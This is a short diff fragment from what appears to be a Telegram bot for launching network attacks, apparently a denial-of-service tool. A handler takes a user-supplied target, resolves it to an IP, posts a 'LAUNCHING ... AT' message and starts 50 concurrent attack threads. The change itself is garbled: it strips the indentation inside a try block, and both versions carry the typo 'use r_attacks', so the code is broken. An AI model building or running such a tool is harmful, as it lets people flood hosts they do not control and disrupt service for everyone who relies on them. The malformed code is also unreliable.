@@ -100,9 +100,9 @@ def execute_attack(message):
     target = message.text.strip()
     
     try:
-        ip = socket.gethostbyname(target) if not is_valid_ip(target) else target
-        method_id = use r_attacks[chat_id]['method']
-        bot.send_message(chat_id, f"⚡ LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
+    ip = socket.gethostbyname(target) if not is_valid_ip(target) else target
+    method_id = use r_attacks[chat_id]['method']
+    bot.send_message(chat_id, f"⚡ LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
         
         # Multi-threaded attack launch
         for _ in range(50):  # 50 concurrent threads
